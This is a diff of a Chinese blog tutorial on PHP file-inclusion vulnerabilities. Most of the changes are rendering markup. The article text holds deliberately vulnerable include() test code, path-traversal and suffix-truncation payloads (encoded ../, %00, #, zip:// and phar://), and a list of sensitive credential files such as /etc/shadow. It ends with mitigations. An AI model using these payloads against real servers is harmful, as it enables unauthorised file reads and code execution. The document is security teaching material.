-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">包含SMTP(日志)<br>包含xss<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">包含SMTP(日志)
+包含xss<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <h2 id="0x04-绕过方法">0x04 绕过方法</h2>
 <h3 id="4-1-指定前缀绕过">4.1 指定前缀绕过</h3>
 <h4 id="4-1-1-目录遍历">4.1.1 目录遍历</h4>
 <p><strong>使用 …/…/ 来返回上一目录，被称为目录遍历(Path Traversal)。例如 ?file=…/…/phpinfo/phpinfo.php</strong><br>
 <strong>测试代码如下：</strong></p>
-<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>	<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>	<span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"file"</span>];<br>	<span class="hljs-comment">//前缀</span><br>	<span class="hljs-keyword">include</span> <span class="hljs-string">"/var/www/html/"</span>.<span class="hljs-variable">$file</span>;<br><br>	<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+	<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+	<span class="token comment">//前缀</span>
+	<span class="token keyword">include</span> <span class="token string double-quoted-string">"/var/www/html/"</span><span class="token operator">.</span><span class="token variable">$file</span><span class="token punctuation">;</span>
+
+	<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><strong>现在在/var/log目录下有文件flag.txt，则利用…/可以进行目录遍历，比如我们尝试访问：</strong></p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">include.php?file=../../log/flag.txt<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">include.php?file=../../log/flag.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><strong>则服务器端实际拼接出来的路径为：/var/www/html/…/…/log/test.txt，即 /var/log/flag.txt，从而包含成功。</strong></p>
 <h4 id="4-1-2-编码绕过">4.1.2 编码绕过</h4>
 <p><strong>服务器端常常会对于…/等做一些过滤，可以用一些编码来进行绕过。</strong><br>
 <strong>1.利用url编码</strong></p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">../<br><br>    %2e%2e%2f<br>    ..%2f<br>    %2e%2e/<br><br>..\<br><br>    %2e%2e%5c<br>    ..%5c<br>    %2e%2e\<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">../
+
+    %2e%2e%2f
+    ..%2f
+    %2e%2e/
+
+..\
+
+    %2e%2e%5c
+    ..%5c
+    %2e%2e\<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><strong>2.二次编码</strong></p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">../<br><br>    %252e%252e%252f<br>..\<br><br>    %252e%252e%255c<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">../
+
+    %252e%252e%252f
+..\
+
+    %252e%252e%255c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><strong>3.容器/服务器的编码方式</strong></p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">../<br><br>    ..%c0%af<br>        注：Why does Directory traversal attack %C0%AF work?<br><br>    %c0%ae%c0%ae/<br>    <br>        注：java中会把”%c0%ae”解析为”\uC0AE”，最后转义为ASCCII字符的”.”（点）<br>        Apache Tomcat Directory Traversal<br><br>..\<br><br>    ..%c1%9c<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">../
+
+    ..%c0%af
+        注：Why does Directory traversal attack %C0%AF work?
+
+    %c0%ae%c0%ae/
+    
+        注：java中会把”%c0%ae”解析为”\uC0AE”，最后转义为ASCCII字符的”.”（点）
+        Apache Tomcat Directory Traversal
+
+..\
+
+    ..%c1%9c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>注：那里的超链接是：<a target="_blank" rel="noopener" href="https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work">Why does Directory traversal attack %C0%AF work?</a></p>
 <h3 id="4-2-指定后缀绕过">4.2 指定后缀绕过</h3>
 <p><strong>后缀绕过测试代码如下，下述各后缀绕过方法均使用此代码：</strong></p>
-<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>	<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>	<span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"file"</span>];<br>	<span class="hljs-comment">//后缀</span><br>	<span class="hljs-keyword">include</span> <span class="hljs-variable">$file</span>.<span class="hljs-string">".txt"</span>;<br><br>	<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+	<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+	<span class="token comment">//后缀</span>
+	<span class="token keyword">include</span> <span class="token variable">$file</span><span class="token operator">.</span><span class="token string double-quoted-string">".txt"</span><span class="token punctuation">;</span>
+
+	<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h4 id="4-2-1-利用url">4.2.1 利用url</h4>
 <p><strong>在远程文件包含漏洞（RFI）中，可以利用query或fragment来绕过后缀限制。<br>
 可参考此文章：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/2c07fbb52b45">URI’s fragment</a></strong></p>
 <p><strong>完整url格式：</strong></p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">protocol :// hostname[:port] / path / [;parameters][?query]#fragment<br></code></pre></td></tr></tbody></table></figure>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">query(?)<br><br>    [访问参数] ?file=http://localhost:8081/phpinfo.php?<br>    [拼接后]  ?file=http://localhost:8081/phpinfo.php?.txt<br>    <br>    上述可能是?截断：<br>    ?号截断，在路径后面输入?号，服务器会认为?号后面的内容为GET方法传递的参数而被丢弃，成功读取getshell如下：<br>    <br>   空格绕过<br>  这里也是一样需要使用编码%20进行绕过，不能直接输入空格。<br>  ?file=http://localhost:8081/phpinfo.php%20.txt<br>  <br>  #号绕过：<br>  ?file=http://localhost:8081/phpinfo.php%23.txt<br>	注：这里需要对#进行url编码，#的url编码为%23<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">protocol :// hostname[:port] / path / [;parameters][?query]#fragment<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">query(?)
+
+    [访问参数] ?file=http://localhost:8081/phpinfo.php?
+    [拼接后]  ?file=http://localhost:8081/phpinfo.php?.txt
+    
+    上述可能是?截断：
+    ?号截断，在路径后面输入?号，服务器会认为?号后面的内容为GET方法传递的参数而被丢弃，成功读取getshell如下：
+    
+   空格绕过
+  这里也是一样需要使用编码%20进行绕过，不能直接输入空格。
+  ?file=http://localhost:8081/phpinfo.php%20.txt
+  
+  #号绕过：
+  ?file=http://localhost:8081/phpinfo.php%23.txt
+	注：这里需要对#进行url编码，#的url编码为%23<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><strong>Example：</strong>（设在根目录下有flag2.txt文件）</p>
-<p><img src="image-20230321203740146.png" alt="image-20230321203740146"></p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">fragment(#)<br><br>    [访问参数] ?file=http://localhost:8081/phpinfo.php%23<br>    [拼接后]  ?file=http://localhost:8081/phpinfo.php#.txt<br></code></pre></td></tr></tbody></table></figure>
+<p><img src="/2023/08/07/qian-xi-wen-jian-bao-han/image-20230321203740146.png" alt="image-20230321203740146"></p>
+<pre class="line-numbers language-none"><code class="language-none">fragment(#)
+
+    [访问参数] ?file=http://localhost:8081/phpinfo.php%23
+    [拼接后]  ?file=http://localhost:8081/phpinfo.php#.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <p><strong>Example：</strong>（设在根目录下有flag2.txt文件）</p>
-<p><img src="image-20230321203837999.png" alt="image-20230321203837999"></p>
+<p><img src="/2023/08/07/qian-xi-wen-jian-bao-han/image-20230321203837999.png" alt="image-20230321203837999"></p>
 <p><strong>其他绕过方式：</strong></p>
 <p>一些常见的特殊字符URL编码：</p>
-<p><img src="image-20230618164128542.png" alt="image-20230618164128542"></p>
+<p><img src="/2023/08/07/qian-xi-wen-jian-bao-han/image-20230618164128542.png" alt="image-20230618164128542"></p>
 <p>这里可以用burp爆破一遍，看哪个能用</p>
 <h4 id="4-2-2-利用协议">4.2.2 利用协议</h4>
 <p><strong>利用zip://和phar://，由于整个压缩包都是我们的可控参数，那么只需要知道他们的后缀，便可以自己构建。</strong></p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">zip://<br><br>    [访问参数] ?file=zip://D:\zip.jpg%23phpinfo<br>    [拼接后]  ?file=zip://D:\zip.jpg#phpinfo.txt<br><br>phar://<br><br>    [访问参数] ?file=phar://zip.zip/phpinfo<br>    [拼接后]  ?file=phar://zip.zip/phpinfo.txt<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">zip://
+
+    [访问参数] ?file=zip://D:\zip.jpg%23phpinfo
+    [拼接后]  ?file=zip://D:\zip.jpg#phpinfo.txt
+
+phar://
+
+    [访问参数] ?file=phar://zip.zip/phpinfo
+    [拼接后]  ?file=phar://zip.zip/phpinfo.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><strong>Example：</strong><br>
 <em><em>(我的环境根目录中有php.zip压缩包，内含phpinfo.txt，其中包含代码<!--?php phpinfo();?-->)）</em><br>
 所以分别构造payload为：</em>*</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?file=zip://D:\PHPWAMP_IN3\wwwroot\php.zip%23phpinfo<br><br>?file=phar://../../php.zip/phpinfo<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">?file=zip://D:\PHPWAMP_IN3\wwwroot\php.zip%23phpinfo
+
+?file=phar://../../php.zip/phpinfo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p><strong>对应的结果分别为：</strong></p>
-<p><img src="image-20230321204222933.png" alt="image-20230321204222933"></p>
-<p><img src="image-20230321204231560.png" alt="image-20230321204231560"></p>
+<p><img src="/2023/08/07/qian-xi-wen-jian-bao-han/image-20230321204222933.png" alt="image-20230321204222933"></p>
+<p><img src="/2023/08/07/qian-xi-wen-jian-bao-han/image-20230321204231560.png" alt="image-20230321204231560"></p>
 <h4 id="4-2-3-长度截断">4.2.3 长度截断</h4>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">利用条件：<br><br>    php版本&lt;php 5.2.8<br><br>原理：<br><br>    Windows下目录最大长度为256字节，超出的部分会被丢弃<br>    Linux下目录最大长度为4096字节，超出的部分会被丢弃。<br><br>利用方法：<br><br>    只需要不断的重复 ./(Windows系统下也可以直接用 . 截断)<br></code></pre></td></tr></tbody></table></figure>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?file=shell.php./././。。省略。。<br>//指定的后缀的被丢弃，成功包含木马文件<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">利用条件：
+
+    php版本&lt;php 5.2.8
+
+原理：
+
+    Windows下目录最大长度为256字节，超出的部分会被丢弃
+    Linux下目录最大长度为4096字节，超出的部分会被丢弃。
+
+利用方法：
+
+    只需要不断的重复 ./(Windows系统下也可以直接用 . 截断)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">?file=shell.php./././。。省略。。
+//指定的后缀的被丢弃，成功包含木马文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p><strong>则指定的后缀.txt会在达到最大值后会被直接丢弃掉</strong></p>
 <h4 id="4-2-4-00截断">4.2.4 %00截断</h4>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">HP魔术引导介绍<br><br>  当sql句中含有单引号，双引号，反斜杠和NUL时，这时候如果不对这些符号进行转义，写入数据库时就会出错，而魔术引号magic_quotes_gpc()就是对这些符号进行转义以便能把数据正确写入数据库。不过该参数在php.ini文件中修改。<br>  PHP魔术引号特性已自 PHP5.3.0起废弃并将自PHP5.4.0起移除。也就是说在本实验环境的PHP版本中仍是存在的<br></code></pre></td></tr></tbody></table></figure>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">在低版本中php读取文件名时认为%00是终止符，对于%00后面的内容就会失效<br> <br>利用条件：<br><br>    magic_quotes_gpc = Off<br>    php版本 &lt; php 5.3.4<br><br>利用方法：<br><br>    直接在文件名的最后加上%00来截断指定的后缀名<br>      ?file=shell.php%00<br>//现阶段%00截断不常用<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">HP魔术引导介绍
+
+  当sql句中含有单引号，双引号，反斜杠和NUL时，这时候如果不对这些符号进行转义，写入数据库时就会出错，而魔术引号magic_quotes_gpc()就是对这些符号进行转义以便能把数据正确写入数据库。不过该参数在php.ini文件中修改。
+  PHP魔术引号特性已自 PHP5.3.0起废弃并将自PHP5.4.0起移除。也就是说在本实验环境的PHP版本中仍是存在的<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">在低版本中php读取文件名时认为%00是终止符，对于%00后面的内容就会失效
+ 
+利用条件：
+
+    magic_quotes_gpc = Off
+    php版本 &lt; php 5.3.4
+
+利用方法：
+
+    直接在文件名的最后加上%00来截断指定的后缀名
+      ?file=shell.php%00
+//现阶段%00截断不常用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h4 id="4-2-5-点号截断">4.2.5 点号截断</h4>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">原理：<br>    windows系统 点号 长于 256，超出的部分会被丢弃；<br>    linux系统 点号 长于 4096，超出的部分会被丢弃；<br>示例：<br>http://192.168.100.150/test_include/index.php?page=1.png.................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................<br><br>burp抓包修改即可<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">原理：
+    windows系统 点号 长于 256，超出的部分会被丢弃；
+    linux系统 点号 长于 4096，超出的部分会被丢弃；
+示例：
+http://192.168.100.150/test_include/index.php?page=1.png.................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................
+
+burp抓包修改即可<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h4 id="4-2-6-双写绕过">4.2.6 双写绕过</h4>
 <p><strong>当写入文件时，发现删除某些特殊字符，我们可以判断是删除了其中字符，例如”php"，“…/”，只需</strong><br>
 <strong>再增加一个使其删除后得到我们需要的，需要注意绝对路径与相对路径。</strong></p>
@@ -772,8 +968,27 @@ session文件的内容为：<code>username|s:18:"&lt;?php phpinfo();?&gt;"</code
 <p><strong>4、对上传的文件进行重命名，防止被读取</strong></p>
 <p><strong>5、对于动态包含的文件可以设置一个白名单，不读取非白名单的文件。</strong></p>
 <p><strong>6、做好管理员权限划分，做好文件的权限管理，allow_url_include和allow_url_fopen最小权限化</strong></p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">./表示当前位置路径，../表示上一级路径位置，在linux中同样适用。<br></code></pre></td></tr></tbody></table></figure>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">3）一些常见的敏感信息路径：<br><br>Windows系统：<br><br>    c:\boot.ini // 查看系统版本<br>    c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件<br>    c:\windows\repair\sam // 存储Windows系统初次安装的密码<br>    c:\ProgramFiles\mysql\my.ini // MySQL配置<br>    c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码<br>    c:\windows\php.ini // php 配置信息<br><br>Linux/Unix系统：<br><br>    /etc/passwd // 账户信息<br>    /etc/shadow // 账户密码文件<br>    /usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件<br>    /usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置<br>    /usr/local/app/php5/lib/php.ini // PHP相关配置<br>    /etc/httpd/conf/httpd.conf // Apache配置文件<br>    /etc/my.conf // mysql 配置文件<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">./表示当前位置路径，../表示上一级路径位置，在linux中同样适用。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">3）一些常见的敏感信息路径：
+
+Windows系统：
+
+    c:\boot.ini // 查看系统版本
+    c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件
+    c:\windows\repair\sam // 存储Windows系统初次安装的密码
+    c:\ProgramFiles\mysql\my.ini // MySQL配置
+    c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码
+    c:\windows\php.ini // php 配置信息
+
+Linux/Unix系统：
+
+    /etc/passwd // 账户信息
+    /etc/shadow // 账户密码文件
+    /usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件
+    /usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置
+    /usr/local/app/php5/lib/php.ini // PHP相关配置
+    /etc/httpd/conf/httpd.conf // Apache配置文件
+    /etc/my.conf // mysql 配置文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
                 
             </div>
             <hr/>
@@ -856,100 +1071,7 @@ session文件的内容为：<code>username|s:18:"&lt;?php phpinfo();?&gt;"</code
                 </div>
             </div>
             
-                <style>
-    #reward {
-        margin: 40px 0;
-        text-align: center;
-    }
-
-    #reward .reward-link {
-        font-size: 1.4rem;
-        line-height: 38px;
-    }
-
-    #reward .btn-floating:hover {
-        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
-    }
-
-    #rewardModal {
-        width: 320px;
-        height: 350px;
-    }
-
-    #rewardModal .reward-title {
-        margin: 15px auto;
-        padding-bottom: 5px;
-    }
-
-    #rewardModal .modal-content {
-        padding: 10px;
-    }
-
-    #rewardModal .close {
-        position: absolute;
-        right: 15px;
-        top: 15px;
-        color: rgba(0, 0, 0, 0.5);
-        font-size: 1.3rem;
-        line-height: 20px;
-        cursor: pointer;
-    }
-
-    #rewardModal .close:hover {
-        color: #ef5350;
-        transform: scale(1.3);
-        -moz-transform:scale(1.3);
-        -webkit-transform:scale(1.3);
-        -o-transform:scale(1.3);
-    }
-
-    #rewardModal .reward-tabs {
-        margin: 0 auto;
-        width: 210px;
-    }
-
-    .reward-tabs .tabs {
-        height: 38px;
-        margin: 10px auto;
-        padding-left: 0;
-    }
-
-    .reward-content ul {
-        padding-left: 0 !important;
-    }
-
-    .reward-tabs .tabs .tab {
-        height: 38px;
-        line-height: 38px;
-    }
-
-    .reward-tabs .tab a {
-        color: #fff;
-        background-color: #ccc;
-    }
-
-    .reward-tabs .tab a:hover {
-        background-color: #ccc;
-        color: #fff;
-    }
-
-    .reward-tabs .wechat-tab .active {
-        color: #fff !important;
-        background-color: #22AB38 !important;
-    }
-
-    .reward-tabs .alipay-tab .active {
-        color: #fff !important;
-        background-color: #019FE8 !important;
-    }
-
-    .reward-tabs .reward-img {
-        width: 210px;
-        height: 210px;
-    }
-</style>
-
-<div id="reward">
+                <div id="reward">
     <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
 
     <!-- Modal Structure -->
@@ -990,6 +1112,275 @@ session文件的内容为：<code>username|s:18:"&lt;?php phpinfo();?&gt;"</code
     
 
     
+
+    
+
+    
+        <style>
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+
+    #vcomments textarea {
+        box-sizing: border-box;
+        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
+    }
+
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #4cbf30;
+        font-weight: 500;
+        text-decoration: none;
+    }
+
+    #vcomments img {
+        max-width: 100%;
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
